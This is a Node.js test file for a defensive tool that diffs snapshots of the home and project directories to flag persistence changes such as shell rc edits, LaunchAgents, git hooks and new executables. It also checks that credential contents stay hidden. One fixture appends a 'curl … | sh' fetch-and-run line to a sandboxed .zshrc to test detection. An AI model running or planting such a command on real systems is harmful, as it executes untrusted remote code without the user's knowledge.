import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import path from 'node:path';
import test from 'node:test';
import { diffSnapshots } from '../src/diff.js';
import { takeSnapshot } from '../src/snapshot.js';
import { hermetic, sandbox } from './helpers.js';

async function snap(sb, extra = {}) {
  return takeSnapshot({ home: sb.home, cwd: sb.project, ...hermetic, ...extra });
}

test('reports nothing when nothing changed', async () => {
  const sb = await sandbox();
  try {
    await fs.writeFile(path.join(sb.home, '.zshrc'), 'export A=1\n');
    const findings = diffSnapshots(await snap(sb), await snap(sb));
    assert.deepEqual(findings, []);
  } finally {
    await sb.cleanup();
  }
});

test('reports appended lines in a shell rc file as high severity with hints', async () => {
  const sb = await sandbox();
  try {
    const rc = path.join(sb.home, '.zshrc');
    await fs.writeFile(rc, 'export A=1\n');
    const before = await snap(sb);
    await fs.appendFile(rc, 'curl -s https://x.test/i.sh | sh\n');
    const [f, ...rest] = diffSnapshots(before, await snap(sb));
    assert.equal(rest.length, 0);
    assert.equal(f.title, '~/.zshrc');
    assert.equal(f.action, 'modified');
    assert.equal(f.severity, 'high');
    assert.deepEqual(f.lines?.added, ['curl -s https://x.test/i.sh | sh']);
    assert.ok(f.notes.includes('pipes a download straight into a shell'));
  } finally {
    await sb.cleanup();
  }
});

test('never exposes the contents of credential files', async () => {
  const sb = await sandbox();
  try {
    const before = await snap(sb);
    await fs.writeFile(path.join(sb.home, '.npmrc'), '//r.test/:_authToken=npm_' + 'x'.repeat(36) + '\n');
    const after = await snap(sb);
    const f = diffSnapshots(before, after).find((x) => x.title === '~/.npmrc');
    assert.ok(f);
    assert.equal(f.lines, undefined);
    assert.ok(f.notes.includes('contents hidden'));
    assert.doesNotMatch(JSON.stringify(after), /npm_x{10}/);
  } finally {
    await sb.cleanup();
  }
});

test('detects a new LaunchAgent and ignores the directory entry it created', async () => {
  const sb = await sandbox();
  try {
    const before = await snap(sb);
    const dir = path.join(sb.home, 'Library', 'LaunchAgents');
    await fs.mkdir(dir, { recursive: true });
    await fs.writeFile(path.join(dir, 'a.plist'), '<key>RunAtLoad</key>\n');
    const findings = diffSnapshots(before, await snap(sb));
    const titles = findings.map((f) => f.title);
    assert.ok(titles.includes('~/Library/LaunchAgents/a.plist'));
    assert.ok(!titles.includes('~/Library/LaunchAgents/'));
    assert.equal(findings.find((f) => f.title.endsWith('a.plist'))?.severity, 'high');
  } finally {
    await sb.cleanup();
  }
});

test('detects deletions and downgrades their severity', async () => {
  const sb = await sandbox();
  try {
    const rc = path.join(sb.home, '.bashrc');
    await fs.writeFile(rc, 'x\n');
    const before = await snap(sb);
    await fs.rm(rc);
    const [f] = diffSnapshots(before, await snap(sb));
    assert.equal(f.action, 'removed');
    assert.equal(f.severity, 'medium');
  } finally {
    await sb.cleanup();
  }
});

test('flags new executable files on PATH and chmod +x', async () => {
  const sb = await sandbox();
  try {
    const bin = path.join(sb.home, '.local', 'bin');
    await fs.mkdir(bin, { recursive: true });
    const tool = path.join(bin, 'tool');
    await fs.writeFile(tool, 'echo hi\n', { mode: 0o644 });
    const before = await snap(sb);
    await fs.chmod(tool, 0o755);
    const [f] = diffSnapshots(before, await snap(sb));
    assert.ok(f.notes.includes('became executable'));
  } finally {
    await sb.cleanup();
  }
});

test('summarises project changes and surfaces git hooks', async () => {
  const sb = await sandbox();
  try {
    await fs.mkdir(path.join(sb.project, '.git', 'hooks'), { recursive: true });
    await fs.writeFile(path.join(sb.project, 'a.txt'), 'a');
    const before = await snap(sb);
    await fs.writeFile(path.join(sb.project, 'b.txt'), 'b');
    await fs.writeFile(path.join(sb.project, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\nexit 0\n');
    const findings = diffSnapshots(before, await snap(sb));
    const hook = findings.find((f) => f.title === './.git/hooks/pre-commit');
    assert.equal(hook?.severity, 'high');
    const summary = findings.find((f) => f.category === 'project');
    assert.match(summary?.title ?? '', /2 added/);
    assert.ok(summary?.notes.includes('+ b.txt'));
  } finally {
    await sb.cleanup();
  }
});

test('ignore option drops matching paths', async () => {
  const sb = await sandbox();
  try {
    const opts = { ignore: ['.zshrc'] };
    const before = await snap(sb, opts);
    await fs.writeFile(path.join(sb.home, '.zshrc'), 'x\n');
    assert.deepEqual(diffSnapshots(before, await snap(sb, opts)), []);
  } finally {
    await sb.cleanup();
  }
});

test('custom --watch paths are tracked', async () => {
  const sb = await sandbox();
  try {
    const dir = path.join(sb.root, 'elsewhere');
    await fs.mkdir(dir);
    const opts = { watch: [dir] };
    const before = await snap(sb, opts);
    await fs.writeFile(path.join(dir, 'f.txt'), 'hello\n');
    const findings = diffSnapshots(before, await snap(sb, opts));
    assert.ok(findings.some((f) => f.title.endsWith('f.txt')));
  } finally {
    await sb.cleanup();
  }
});
